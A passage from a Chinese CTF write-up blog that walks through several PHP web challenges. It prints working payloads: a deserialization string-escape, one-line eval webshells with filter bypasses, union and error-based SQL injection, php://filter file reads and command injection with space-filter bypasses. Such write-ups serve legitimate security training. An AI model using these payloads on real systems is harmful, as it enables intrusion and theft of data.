user();$user-&gt;connect($config); class.php中的限制： 1.update_profile 中对 new_profile 用 filter 进行了过滤；filter的功能是通过正则匹配把字符串中存在的&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;替换成&#39;hacker&#39; config.php： 1234567&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt; 我们可以看到在config.php中有变量flag，但为空，flag应该在服务器的config.php文件中，可以利用的漏洞读取服务器的flag register.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php require_once(&#x27;class.php&#x27;); if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die(&#x27;Invalid user name&#x27;); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die(&#x27;Invalid password&#x27;); if(!$user-&gt;is_exists($username)) &#123; $user-&gt;register($username, $password); echo &#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;; &#125; else &#123; die(&#x27;User name Already Exists&#x27;); &#125; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form action=&quot;register.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Register&lt;/h3&gt; &lt;label&gt;Username:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Password:&lt;/label&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;REGISTER&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; 这个就是注册页面对应的源码，没什么特别的 update.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;UPDATE&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Please Update Your Profile&lt;/h3&gt; &lt;label&gt;Phone:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Nickname:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt; &lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; 这是更新profile的源码。限制： 1.电话号码的长度应为11； 2.nickname长度小于 10 位，且只能为字母和数字；（注意此处的^，这个正则的意思是匹配除了a-zA-Z0-9_之外的字符,因为 ^ 符号是在 []里面，所以是非的意思，不是开始的意思。） 3.对上传的信息进行了序列化。 看到这里的时候我还以为会不会是文件上传漏洞，上传一句话木马，但是发现他没有告诉我们文件上传地址，因此无法进一步操作，那就接着往下看吧 profile.php： 12345678910111213141516171819202122232425262728293031323334353637&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Profile&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt; &lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt; &lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; 先判断参数profile的值是否为空，不为空则反序列化profile，然后把对应值回显到网页上 我们先在来梳理一下思路： 1.flag在config.php文件里，但是我们无法直接获取flag； 2.update.php对上传的数据做序列化处理； 3.profile.php会把update的数据反序列化然后回显到网页上，并且参数photo会以base64的方式读取上传图片； 4.nickname长度小于 10 位，且只能为字母和数字。 据此我们会想能不能利用file_get_contents函数获取服务器端的config.php文件，这就涉及到了反序列化字符逃逸。 PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的 如： 1o:1:&#123;s:4:&quot;name&quot;;s:6:&quot;linbei&quot;;&#125; 篡改name的值，在name的地方输入name&quot;;s:5:&quot;linmu&quot;;&#125;，则序列化后变成： 1o:1:&#123;s:19:&quot;name&quot;;s:5:&quot;linmu&quot;;&#125;&quot;;s:6:&quot;linbei&quot;;&#125; 我们看到第一个s的值原本是4的但是此时却是19，那么这样的字符串反序列化后&quot;;s:6:&quot;linbei&quot;;&#125;还是无法逃逸，也就是说s:5:&quot;linmu&quot;没有顶替其的位置，但是好在class.php文件中有filter，我们可以利用filter的功能把字符串中存在的&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;替换成&#39;hacker&#39;，其中符合替换后长度增加的只有where。 我们希望上传后数据序列化变成： 1o:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:11:&quot;11111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:38:&quot;abc&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:*:******;&#125; 也就是把原本$photo对应序列化的值顶掉，换成我们希望的config.php，那么我们要让;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;逃逸 ;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;长度为34，当字符串中出现一个where时，替换后增加一个长度，当出现34个where时，那么字符串增加34个长度，此时读取量s不变，增加的长度就把;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;顶出去了。 但是这时又面临一个问题：nickname的值有长度限制，由于strlen()函数无法判别数组，因此我们可以抓包更改nickname属性为数组 我们试着构造payload： $phone = 11111111111$email = 11111@qq.com$nickname[] = wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;$photo = 随便上传一个满足要求的文件 上传成功： base64解码： sp：部分函数的数组绕过： 1234567sha1(Array()) &#x3D; nullereg(pattern,Array()) &#x3D;nullpreg_match(pattern,Array()) &#x3D; falsestrcmp(Array(), “abc”) &#x3D;nullstrpos(Array(),“abc”) &#x3D; nullstrlen(Array()) &#x3D; nullmd5(Array()) &#x3D; null 参考链接：https://blog.csdn.net/qq_43622442/article/details/105751356 https://blog.csdn.net/qq_43054896/article/details/105586792","tags":[{"name":"ISCC","slug":"ISCC","permalink":"http://example.com/tags/ISCC/"}]},{"title":"i春秋","date":"2021-04-29T02:17:47.000Z","path":"2021/04/29/i春秋2/","text":"2017第二届广东省强网杯线上赛broken——（jsfuck）打开容器： 点开文件： 发现全是这样的乱码，查阅资料发现这是一种jsfuck编码：JSFuck 可以让你只用 6 个字符[ ] ( ) ! +来编写 JavaScript 程序。 我们赋值这段字符串，贴在控制台 点击&#123;&#125;美化表达式，运行发现报错，对比一下表达式，发现第一行的[没有对应]匹配，我们把它加上，页面弹出一个窗口 我们猜测弹出这个窗口的源码或为alert(‘flag is not here’)，把这段源码jsfuck编码，发现其长度也不过26806，而上面jsfuck表达式的长度有127763，说明这其中还有别的代码，而flag很有可能藏在其中，那么我们接下来就想怎么能获得源码呢？ 查看了wp他是说把结尾的()删去，再补个]，同时把刚开始时补的]删去 解释是该段代码最后()代表的是函数的结尾，所以只要把最后这个括号删掉就不会弹框了 1","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"i春秋","date":"2021-04-19T14:25:33.000Z","path":"2021/04/19/i春秋1/","text":"第三届“百越杯”福建省高校网络空间安全大赛（upload文件上传漏洞）打开题目地址发现是一道文件上传题，尝试上传一个shell内容，jpg后缀的文件，发现上传成功，说明不检查文件内容 再上传一次，burp抓包，修改后缀jpg为php，发现也上传成功 用蚁剑连接 没有直接给我们flag，那么可能”藏“起来了 在虚拟终端上寻找，也找不到 然后我以为flag被删了，看了大佬的博客才知道，config文件里面有内容 于是我们在蚁剑的主页选择数据操作，添加数据库，连接用户和连接密码时刚刚配置文件的内容 其实感觉能猜到config里面有东西还是蛮神奇的，可能是config文件是配置文件的原因，所以会下意识的去那里找线索。 “百度杯”CTF比赛 九月场（文件上传漏洞）我们先上传一个shell内容，jpg后缀的文件，发现上传成功，说明不检查文件内容。然后在上传上传一次，burp拦截修改后缀为php，也上传成功。但是他并没有直接告诉我们他上传的位置，我们查看源码可以看到 点击进入网页 我们都知道，按理来说这里不应该显出源码的，那么对比说明这里过滤了&lt;? 和php 我们可以尝试换标签（如&lt;script&gt;）来绕过&lt;?过滤 通过大小写来绕过php过滤 法1：构造一个内容为： 1&lt;script language&#x3D;&quot;pHp&quot;&gt;@eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt; 后缀为jsp的文件，上传，蚁剑连接 法2：https://blog.csdn.net/ITmincherry/article/details/102531096 “百度杯”CTF比赛 2017 二月场（文件包含漏洞）我们看到这是一道文件包含漏洞题： 我们会想到利用PHP的输入流php://input 我们看到有一个文件名比较奇特，用PHP://filter读取dle345aae.php文件 再base64解码得 “百度杯”CTF比赛 九月场——123打开容器，发现一个登入框，还以为是sql注入，尝试了一下发现都是报错，查看源码： 然后查看user.php，但是发现网页里面什么也没有，源码也是 于是我用御剑扫了一下端口，发现有一个flag.php的文件，但是点景区，发现被骗了，是假的。 于是看了大佬的提示，这里应该查看user.php的备份文件user.php.bak，属于备份隐私泄露 下载下来，里面都是用户名，根据login.php源码的提示，密码由用户名+生日年份构成 尝试burp爆破： 设定两个参数，然后更改攻击模式为battering ram，即对两个参数同时爆破，且payload相同 我们猜测这么多用户里面应该会有人是1995年出生的，然后爆破出 用爆破出的用户名密码登入，页面什么内容也没有，查看源码发现： F12进入开发者模式将注释符都删掉，得到一个上传框，上传一句话木马文件， 上传后缀jpg的一句话木马 这就有点奇怪了，为什么明明已经是白名单的后缀了，文件名还是不合法 尝试利用Apache的后缀解析 删去一句话木马 打开/view.php网页 传参：?file=1 过滤了flag，尝试双写绕过 SP: burp的几种攻击模式：https://blog.csdn.net/qq_39101049/article/details/90234669","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf2","date":"2021-04-13T10:42:02.000Z","path":"2021/04/13/buuctf2/","text":"[极客大挑战 2019]LoveSQL这关之前有做过类似的，但是这个应该是升级版 进过尝试可知注入类型为单引号注入，用万能密码尝试登入 发现这次flag不在里面了，那我们尝试一下获取他的数据库信息 法1： union联合注入 确认返回字段数：1&#39; union select 1,2,3# 爆库：1&#39; union select 1,2,database()# 爆表：1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;# 爆列：1&#39; union select 1,2,group_cooncat(columns) from information_schema.columns where table_name=&#39;geekuser&#39;# 爆值：1&#39; union select 1,2,group_concat(username,password) from geekuser# 发现该表下只有一行数据：id=1,username=admin,password=“字符串” 于是我们再查一下l0ve1ysq1表——1&#39; union select 1,2,group_concat(username,password) from l0ve1ysq1# 法2： 报错注入： 由于输入1&#39; 会返回报错信息，尝试报错注入： 爆库：1&#39; or extractvalue(1,concat(&#39;#&#39;,database()))# 爆表：1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)))# 爆列：1&#39; or extractvalue(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39;)))# 爆值：1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from geekuser where id=1)))# 发现返回一串字符串，但是flag不在其中，查看另一个表 1&#39; or extractvalue(1,concat(&#39;#&#39;,(select password from l0ve1ysq1 where id=1)))# 发现由于报错注入的返回长度的限制，后续的值没有全部回显在页面上，因此要用substr函数去截，还挺麻烦的，后续的就不写了。 [ACTF2020 新生赛]BackupFile（文件备份+弱口令绕过）打开容器发现什么也没有，查看源码也没有，御剑扫描也没有，看到题目提示备份文件，联想到之前有做过以.bak为后缀的备份文件的题 打开文件发现一段源码 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 代码审计：将get的值赋给参数key，先判断key是否为数字，不是则退出，是则通过intval获取参数中的整数部分，然后和变量str的值进行对比，相等则输出flag。 sp： 由于php弱口令的特性，字符串和数字比较使用==时,字符串会先转换为数字类型再比较 var_dump(‘a’ == 0);//true ——此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0var_dump(‘123a’ == 123);//true ——这里’123a’会被转换为123 php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。举例： var_dump(‘a123’ == 123);//false var_dump(‘1233a’ == 123);//false var_dump(‘123a1’ == 123);//true 因此这里我们只需要构造payload：?key=123即可 [极客大挑战 2019]BuyFlag点开容器，进入PAYFLAG页面，查看源码： 我们需要上传money和password，根据网页提示money=100000000，password=404a绕过is_numeric和php弱口令相等 没什么内容，抓包试试 修改user的值为student，但是这样也不行，那改成1： 太长了，尝试改用科学计数法","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"PHP伪协议","date":"2021-04-08T08:27:15.000Z","path":"2021/04/08/PHP伪协议/","text":"","tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"bugku2","date":"2021-04-07T14:50:37.000Z","path":"2021/04/07/bugku2/","text":"web25 web26（伪造Referer） 我们知道Referer可以伪造的，burp抓包，添加语句：Referer: http://www.google.com 获得flag web27 web28：（伪造X-Forwarded-For）这题就是伪造X-Forwarded-For不多说了 web29 web30：（猜测 || php:input利用||file_get_contents() 函数绕过）题目说txt，什么用呢先记着 打开题目地址，看见源码 新函数： extract() 函数 功能： 从数组中将变量导入到当前的符号表 语法：extract(array,extract_rules,prefix) 参数 描述 array 必需。规定要使用的数组。 extract_rules 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。 可能的值： EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。 EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。 EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。 EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。 EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。 prefix 可选。请注意 prefix 仅在 extract_type 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。 前缀和数组键名之间会自动加上一个下划线。 file_get_contents() 函数 功能：把整个文件读入一个字符串中 语法：file_get_contents(path,include_path,context,start,max_length) 参数 描述 path 必需。规定要读取的文件。 include_path 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。 context 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。 start 可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。 max_length 可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。 代码审计：通过get的方式获取$ac和$fn，file_get_contents() 函数读取文件内容，然后赋值给$f，当$f=$ac时输出flag 法1：由于题目提到一个后缀txt，猜测存在文件名flag.txt，访问，果然存在 构造payload：?ac=bugku&amp;fn=flag.txt 法2：利用php伪协议php://input 当传入的参数值作为文件名打开时，可以将参数值设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。 web31：（御剑扫描+burp暴力破解）刚打开题目地址还以为网络崩了，刷了几次还是一样，那应该就是题目页面了，查看一下源码，没东西，蚁剑扫一下 发现有一个robots.txt，点进去看一下 打开resusl.php 发现这里通过GET方式获取参数x，当x的值等password时应该就会跳出flag了，尝试爆破 web32神仙题，没看源码做个鬼 web34：（upload+一句话木马）打开题目地址，页面上没什么东西，查看源码： 点开upload.php 尝试一句话木马，然后发现它设立了一个白名单，看起来不好绕了 上传图片马，访问上传地址： 我们看到看来服务器过滤了&lt;?php和?&gt; 法1：我们创建一个新文件，后缀jpg，内容&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]); &lt;/script&gt;上传，访问发现一片空白，说明被当做php代码执行了，蚁剑连接，终端寻找 法2：我们创建一个新文件，后缀jpg，内容&lt;script language=&quot;php&quot;&gt;system(&quot;find / -name flag*&quot;); &lt;/script&gt; 访问上传地址 直接?flie=/flag ， flag就出来了 然后我自己修改了一下文件内容：&lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag&quot;); &lt;/script&gt; 访问上传地址 web35：（反序列化）点开题目地址 第一眼看还以为是一道sql注入题，结果发现login点不动。查看源码 点击 尝试传输：?25603 我们看到当cookie的值反序列化后等于key的值时会输出flag，于是我们自然想到将key的值先序列化后赋值给cookie php在线工具：https://c.runoob.com/compile/1 构造payload:Cookie: BUGKU=s:13:&quot;ctf.bugku.com&quot;","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf","date":"2021-04-05T12:29:14.000Z","path":"2021/04/05/buuctf1/","text":"[ACTF2020 新生赛]Include点开容器，发现 点击tips 发现是用文件包含的方式打开flag.php文件 之前刷题有做过用php://filter读取文件源码，这题试一下 用base64-decode 12345678910111213&lt;meta charset=&quot;utf8&quot;&gt;&lt;?phperror_reporting(0);$file = $_GET[&quot;file&quot;];if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123; exit(&#x27;hacker!&#x27;);&#125;if($file)&#123; include($file);&#125;else&#123; echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;&#125;?&gt; index.php里没内容，看一下flag.php里的 用base64-decode 1234&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;ce69e052-72a5-4f31-b4f7-d618aa394082&#125;?&gt; [极客大挑战 2019]Secret File点开容器，发现什么也没有，用御剑跑了一下，发现容易服务器崩，线程少又跑的慢，点击查看源码 点开箭头所指链接 点开箭头所指链接，发现会302跳转到end.php说明这里面有猫腻 burp抓包，发送到Repeater 访问secr3t.php，得一段代码： 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 这里进行下一步的时候我放了一个错误，我知道要用php://filter读取flag文件，但是错误的在index.php后传参的， 也就是：http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=flag.php 这样是错误的，因为index.php没有文件包含， 因此我们要改成：http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php 对箭号所指的字符串base64解码： 12345678910111213141516171819&lt;html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;æå°±å¨è¿é&quot;; $flag &#x3D; &#39;flag&#123;c2a2c0e2-6076-4c2a-a387-f45b291c0978&#125;&#39;; $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39; ?&gt; &lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 得flag [ACTF2020 新生赛]Exec点开容器，发现一个ping窗口 ping一下容器地址 回顾一下系统命令的管道符 1、|（就是按位或），直接执行|后面的语句 2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假 4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 5、; 前后都执行，无论前面真假，同&amp;，（linux也有） ping: f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls——查看当前目录下的文件 看来flag不在当前目录下 ping: f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls /——查看根目录下的文件 我们看到在根目录下存在一个名为flag的文件 ping：f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn | cat /flag 得flag [GXYCTF2019]Ping Ping Ping点开容器 直接开始ping 发现不能payload里面不能有空格 补充一个知识点（命令执行空格绕过）： &lt; &lt;&gt; &gt; 重定向符 %09(需要php环境) $&#123;IFS&#125; $IFS$9 &#123;cat,flag.php&#125; //用逗号实现了空格功能 %20 那么我们尝试用重定向符绕过 发现部分符号也被禁用了， 那么我们尝试用$IFS$9绕过，绕过成功，尝试cat flag 发现flag都被禁了，那我们cat index.php，得一段代码： 12345678910111213141516171819&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125;?&gt; 我们可以看到它禁用了很多的符号，这边要注意它严格过滤了flag——只要字符串中有按顺序存在f l a g就会被警告 法1：由于存在shell_exec，我们可以尝试设参，如构造payload：?ip=127.0.0.1;m=ag;n=fl;cat$IFS$9$n$m.php 这句话其实在终端就执行了两句话，一个是ping端口127.0.0.1，另一个是执行cat flag.php文件。中间两句是设置变量赋值。 法2：内联执行 反引号在linux中作为内联执行，执行输出结果。也就是说 cat ```ls` ``——先执行ls，输出 index.php 和 flag.php 。然后再执行 cat index.php;cat flag.php 这样查看返回页面的源码，得： 参考： 命令执行绕过：https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/ https://www.cnblogs.com/NPFS/p/13279815.html wp：https://blog.csdn.net/vanarrow/article/details/108295481 https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control [极客大挑战 2019]Knife点开容器，发现直接给了我们一句话木马 